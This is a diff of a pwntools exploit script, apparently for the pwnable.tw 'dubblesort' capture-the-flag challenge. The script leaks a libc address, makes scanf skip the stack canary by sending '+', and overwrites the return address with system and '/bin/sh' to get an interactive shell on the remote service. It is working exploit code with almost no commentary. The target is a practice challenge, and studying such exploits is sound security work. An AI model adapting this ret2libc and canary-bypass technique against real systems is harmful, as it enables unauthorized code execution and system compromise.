@@ -4,66 +4,51 @@ import sys
 
 context.terminal = ['tmux', 'splitw', '-h']
 context(log_level="error")
-#p = remote("chall.pwnable.tw", 10101)
-elf = ELF("./libc_32.so.6")
-bin = ELF("./dubblesort")
-p = process("./dubblesort")
-gdb.attach(p,'b *main+319')
+my_libc = ELF("./libc.so.6")
 
-# name goes here -> 0xffffca7c for 64 spots
-# count goes here -> 0xffffca58 this is a %u value
-# 
-# Name variable has old libc address.
-# Sending small value ("\n") will leak libc address
+#### Begin the process
+#p = process("./dubblesort_patched_patched")
+#gdb.attach(p, "b *main+340")
+p = remote("chall.pwnable.tw", 10101)
 
-###### STACK #######
-# 0x1e879 = pop esi, ret
-# 0x1487fb = one_gadget
-# 0x149a28 = pop_ebp
-# 
-
-
+#### Leak Libc
 p.recvuntil(b"What your name :")
-p1 = b"\x80"
-#p2 = "5"
+p1 = b"A"*25
 p.send(p1)
-
 msg1 = p.recvuntil(b"sort :").replace(b',', b' ').split(b' ')
-addr = u32(msg1[1])
-libc = addr-0x1cac90
-libc_base = libc - 0x1edf0
-one_gadget = libc_base + 0x1487fb
-got_libc = libc + 0x1cc210
-print(hex(libc_base))
-print(hex(libc))
-print(hex(one_gadget))
-p.sendline(b"43")
+print(msg1)
+addr = u32(msg1[1][-21:-17])
 
-for i in range(17):
-    p.recvuntil(b"number : ":)
+#### Calculate libc_base and other functions in libc
+libc = addr
+libc_base = libc - 0x1b0041
+system = libc_base + my_libc.symbols["system"]
+binsh = libc_base + next(my_libc.search(b"/bin/sh\x00"))
+#print(hex(libc_base))
+#print(hex(libc))
+#print(hex(system))
+#print(hex(binsh))
+
+#### Number of values to sort
+length = 35
+p.sendline(str(length))
+
+#### Values before canary
+for i in range(24):
+    p.recvuntil(b"number : ")
     p.sendline(b"4")
 
-for i in range(6):
+#### Make scanf ignore canary
+p.recvuntil(b"number : ")
+p.sendline(b"+")
+
+#### Values after canary (fill it with the system address)
+for i in range(9):
     p.recvuntil(b"number : ")
-    p.sendline(str(libc))
+    p.sendline(str(system))
 
-
+#### "/bin/sh\x00" should be placed right after the system function on the stack
 p.recvuntil(b"number : ")
-p.sendline(str(one_gadget))
+p.sendline(str(binsh))
 
-
-
-
-
-#p.recvuntil(b"number : ")
-#p.sendline(str(libc))
-p.recvuntil(b"number : ")
-p.sendline(b"\x00")
-
-'''
-p.recvuntil(b"number : ")
-p.sendline(b"2222")
-'''
-#p.recvuntil(b"number : ")
-#p.send(b"1111")
 p.interactive()
